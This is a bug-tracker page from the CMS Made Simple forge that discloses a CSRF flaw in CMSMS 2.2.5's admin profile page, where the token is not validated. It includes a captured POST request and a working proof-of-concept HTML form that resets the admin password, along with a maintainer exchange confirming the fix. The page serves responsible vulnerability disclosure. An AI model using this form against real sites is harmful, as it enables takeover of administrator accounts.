=== Content from dev.cmsmadesimple.org_6c9eabfb_20250125_080326.html ===


# [CMSMS | CMS Made Simple](http://www.cmsmadesimple.org/)

* [1: Home](http://www.cmsmadesimple.org/ "Home Page, shortcut key=1")
* [2: About](http://www.cmsmadesimple.org/about-link)
  + [2.1: About Us](http://www.cmsmadesimple.org/about-link/about-us)
  + [2.2: CMS Made Simple Demo](https://softaculous.com/demos/cms_made_simple)
  + [2.3: Testimonials](http://www.cmsmadesimple.org/about-link/testimonials)
  + [2.5: Donations](http://www.cmsmadesimple.org/about-link/donations)
  + [2.7: About This Website](http://www.cmsmadesimple.org/about-link/about-this-website)
* [3: Downloads](http://www.cmsmadesimple.org/downloads)
  + [3.1: File Releases](http://dev.cmsmadesimple.org/project/files/6#package-1)
  + [3.3: CMSms Themes Site](http://themes.cmsmadesimple.org/ "CMSms Themes Site")
  + [3.4: Modules](http://dev.cmsmadesimple.org/project/list/module "Get add-on modules to expand functionality here")
  + [3.5: Tags](http://dev.cmsmadesimple.org/project/list/plugin "Get Plugins/tags here")
* [5: Support](https://www.cmsmadesimple.org/support/options)
  + [5.1: Documentation](http://docs.cmsmadesimple.org/)
  + [5.2: FAQ](http://www.cmsmadesimple.org/support/faq)
  + [5.3: Blog](http://www.cmsmadesimple.org/about-link/blog/)
  + [5.4: Slack](https://www.cmsmadesimple.org/support/documentation/chat)
  + [5.5: Participate](https://www.cmsmadesimple.org/community/get-involved/get-involved-overview)
  + [5.6: Report Bug or Feature Request](http://dev.cmsmadesimple.org/bug/list/6)
  + [5.7: Newsletter](https://www.cmsmadesimple.org/community/newsletter)
  + [5.9: CMS Made Simple Hosting](https://www.cmsmadesimple.org/partners)
  + [5.10: Professional Services](https://www.cmsmadesimple.org/support/hire-a-dev)
* [6: Forum](http://forum.cmsmadesimple.org/)
  + [6.1: Rules](http://forum.cmsmadesimple.org/index.php/board%2C40.0.html)
  + [6.2: Announcements](http://forum.cmsmadesimple.org/index.php/board%2C1.0.html)
* [7: Development](http://dev.cmsmadesimple.org/)
  + [7.1: Roadmap](http://www.cmsmadesimple.org/development/roadmap)
  + [7.3: CMSMS Forge](http://dev.cmsmadesimple.org/)
  + [7.5: Translationcenter](http://translations.cmsmadesimple.org/ "Link to TranslationCenter site")

## CMS MADE SIMPLE FORGE

# CMS Made Simple Core

* [Summary](/projects/cmsmadesimple)
* [Files](/project/files/6)
* [Bug Tracker](/bug/list/6)
* [Feature Requests](/feature_request/list/6)
* [Code](/project/code/6)

* [Forge Home](/)
* [Project List](/project/list)
* [Recent Changes](/recent_changes.html "Recent Changes")

* [![Login](/images/icons/users.gif "Login")](/users)
  [Login](/users)

[![Back](/images/icons/back.gif "Back") Back to List](/bug/list/6)
## [#11715] CSRF in the admin profile page allows full admin account takeover

![avatar](http://www.gravatar.com/avatar.php?gravatar_id=005d164414d35158cd3f48db7a706d1e&rating=PG&size=50)

Created By:
Mustafa Hasan ([strukt](/users/strukt))

Date Submitted:
Sat Jan 27 01:11:14 -0500 2018

Assigned To:

Version:
None

CMSMS Version:
2.2.5

Severity:
Minor

Resolution:
Fixed

State:
Closed

Summary:
CSRF in the admin profile page allows full admin account takeover

Detailed Description:
```
When an admin attempts to change their profile information, the following POST
request gets sent:

POST /cmsms/admin/myaccount.php?_sk_=SKVAL HTTP/1.1
Host: HOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/
Cookie: [removed]
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 131

active_tab=maintab&submit_account=Submit&user=admin&password=&passwordagain=&firstname=cccc&lastname=sss&email=test@testhost.com

The problem is that the _sk_ value, which serves as a CSRF token, is not
validated on the server, allowing anyone to craft a POST request that gets sent
whenever an administrator is lured into opening a page controlled by that
someone. The following is an example HTML code that can be used to replicate the
issue:

<form action="http://localhost/cmsms/admin/myaccount.php" method="POST">
	<input type="hidden" name="user" value="admin">
	<input type="hidden" name="password" value="csrf1234">
	<input type="hidden" name="passwordagain" value="csrf1234">
	<input type="hidden" name="active_tab" value="maintab">
	<input type="hidden" name="submit_account" value="Submit">
	<input type="submit" value="CSRF!">
</form>

Paste the above markup to an HTML file and open it in a browser while logged in
with the admin account and click "CSRF!". Logout with the admin account and then
login with the password "csrf1234" to make sure the attack worked.

Regards,
```

## History

Comments
![avatar](http://www.gravatar.com/avatar.php?gravatar_id=005d164414d35158cd3f48db7a706d1e&rating=PG&size=50)

```

Date: 2018-02-02 23:20
Posted By: Mustafa Hasan ([strukt](/users/strukt))

Any news about this ?

```

![avatar](http://www.gravatar.com/avatar.php?gravatar_id=005d164414d35158cd3f48db7a706d1e&rating=PG&size=50)

```

Date: 2018-02-14 02:11
Posted By: Mustafa Hasan ([strukt](/users/strukt))

Hello ? Will I ever get a response ?

```

![avatar](http://www.gravatar.com/avatar.php?gravatar_id=19440408787580f7eb4cfa0a080d6865&rating=PG&size=50)

```

Date: 2018-02-15 10:17
Posted By: Matt Hornsby (DIGI3) ([DIGI3](/users/DIGI3))

We tend to respond once a fix is in place, but can't continually update minor
bug reports with "trying this" and "testing this". We do read them all and do
our best with what limited resources we have. Thanks for your report and
patience.

```

![avatar](http://www.gravatar.com/avatar.php?gravatar_id=922605a433bbd0b87764d02a9227e2e2&rating=PG&size=50)

```

Date: 2018-02-16 09:54
Posted By: Robert Campbell ([calguy1000](/users/calguy1000))

fixed in the next release

```

![avatar](http://www.gravatar.com/avatar.php?gravatar_id=005d164414d35158cd3f48db7a706d1e&rating=PG&size=50)

```

Date: 2018-02-16 10:10
Posted By: Mustafa Hasan ([strukt](/users/strukt))

Thanks and well done, please provide the fix commit link so that I can request a
CVE.

```

Updates

Updated: 2018-02-18 11:53

state: Open => Closed

Updated: 2018-02-16 09:54

resolution\_id: => 7

severity\_id: 2 => 3

* [1: Home](http://www.cmsmadesimple.org/ "Home Page, shortcut key=1")
* [2: About](http://www.cmsmadesimple.org/about-link)
* [3: Downloads](http://www.cmsmadesimple.org/downloads)
* [5: Support](http://www.cmsmadesimple.org/support)
* [6: Forum](http://forum.cmsmadesimple.org/)
* [7: Development](http://dev.cmsmadesimple.org/)

CMS made simple is Free software under the GNU/GPL licence.

Website designed by [Steve Sicherman](http://stevesicherman.com/)

![Spinner](/images/spinner.gif?1174174309)


